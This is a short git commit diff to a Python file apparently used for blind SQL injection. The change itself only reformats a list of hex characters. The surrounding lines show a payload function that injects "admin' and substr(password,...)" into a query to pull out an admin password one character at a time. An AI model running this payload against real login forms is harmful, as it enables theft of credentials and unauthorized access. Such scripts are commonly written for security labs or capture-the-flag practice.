d284c7b97ffbd303f09c97cdc6f8bb8724d1c145
redhoodie09 <53815409+redhoodie09@users.noreply.github.com>
2020-06-27 01:36:25 +1000

    Update sql-injection.py

--- SQLinjection/sql-injection.py
+++ SQLinjection/sql-injection.py
@@ -1,5 +1,5 @@
 import requests
-chars = [1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b','c','d','e', 'f']
+chars = [1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f']
 
 def GetSQL(i, c):
     return "admin' and substr(password,%s,1) = '%s'-- -" % (i, c)
